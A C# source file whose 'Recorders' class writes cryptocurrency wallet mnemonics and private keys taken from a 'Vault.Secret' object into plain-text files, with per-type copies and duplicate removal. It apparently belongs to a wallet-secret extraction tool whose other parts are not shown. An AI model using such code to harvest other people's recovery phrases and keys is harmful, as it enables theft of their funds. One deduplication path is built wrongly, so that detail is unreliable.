using static Structures;
using static Structures.Vault;

public class Recorders
{
    public class Universal
    {
        public static bool RewriteDuplicates(string Path)
        {
            try
            {
                var Data = File.ReadAllText(Path).Split("\n");
                var NewData = string.Join("\n", Data.Distinct().ToList());
                using (var stream = new FileStream(Path, FileMode.Create))
                {
                    using var writer = new StreamWriter(stream);
                    writer.Write(NewData);
                }

                return true;
            }

            catch (Exception)
            {
                return false;
            }
        }

        private static void WriteValues(List<string> values, string savePath, Structures.Types type)
        {
            var uniqueValues = values.Distinct().ToList();

            if (!File.Exists(savePath) && uniqueValues.Count > 0)
                File.Create(savePath).Close();

            uniqueValues.ForEach(value =>
            {
                File.AppendAllText(savePath, $"{value}\n");
                Utils.TryCreateDirectory($"{Path.GetDirectoryName(savePath)}/{type}");
                File.AppendAllText($"{Path.GetDirectoryName(savePath)}/{type}/{Path.GetFileName(savePath)}", $"{value}\n");
            });

            RewriteDuplicates(savePath);
            RewriteDuplicates($"{savePath}/{type}/{Path.GetFileName(savePath)}");
        }

        public static bool Record(string SavePath, Vault.Secret Secret)
        {
            try
            {
                WriteValues(Secret.Mnemonics.Select(mnemonic => mnemonic.Value).ToList(), $"{SavePath}/Mnemonics.txt", Secret.Type);
                WriteValues(Secret.PrivateKeys.Select(key => key.Value).ToList(), $"{SavePath}/PrivateKeys.txt", Secret.Type);
            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                return false;
            }

            return true;
        }
    }
}

